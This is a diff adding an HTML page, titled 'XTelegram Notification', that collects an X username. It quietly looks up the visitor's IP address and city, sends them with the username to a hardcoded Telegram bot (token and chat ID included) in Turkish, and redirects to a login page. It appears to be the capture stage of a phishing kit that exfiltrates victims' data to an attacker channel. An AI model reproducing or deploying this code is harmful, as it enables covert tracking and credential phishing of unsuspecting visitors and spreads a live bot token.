@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XTelegram Notification</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script> <!-- Web3.js library -->
+</head>
+<body>
+    <form id="userForm">
+        <input type="text" id="foreuser" placeholder="Enter username" required>
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        document.getElementById('userForm').addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            // Get the user input and sanitize it
+            const foreuser = document.getElementById('foreuser').value.trim();
+
+            // Get the user's real IP address (using a service like ipinfo.io for more reliable data)
+            let ip = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip || 'Unknown';
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+
+            // Fetch location data from the IP
+            let ulke = 'Unknown';
+            let sehir = 'Unknown';
+            try {
+                const locationResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                const locationData = await locationResponse.json();
+                ulke = locationData.country || 'Unknown';
+                sehir = locationData.city || 'Unknown';
+            } catch (error) {
+                console.error('Error fetching location:', error);
+            }
+
+            // Set the current time based on Istanbul's timezone
+            const curTime = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+
+            // Construct the Telegram message
+            const message = `*${foreuser} Forma Giriyor! :)*\n\n` +
+                            `*Kullanıcı adı:* \`${foreuser}\`\n` +
+                            `*Konum:* ${ulke} / ${sehir}\n` +
+                            `*Tarih:* ${curTime}\n` +
+                            `*IP Adresi:* \`${ip}\`\n` +
+                            `*Link:* [X Profiline Git](https://x.com/${foreuser})\n\n`;
+
+            // Replace these variables with your actual Telegram bot's chat ID and token
+            const chatId = '-1002301983998';
+            const token = '7272527468:AAHGOVvd0-H8IhhX3-SVnWeX7aCY9aSH1us';
+
+            // Send the message to Telegram
+            try {
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (!telegramResponse.ok) {
+                    throw new Error('Failed to send message to Telegram');
+                }
+
+                alert('Message sent to Telegram successfully!');
+                window.location.href = 'login.html'; // Adjust this to your actual login page
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+                alert('Failed to send message to Telegram');
+            }
+        });
+    </script>
+</body>
+
+</html>
+<style>
+    body {
+      background-color: gray;
+    }
+</style>
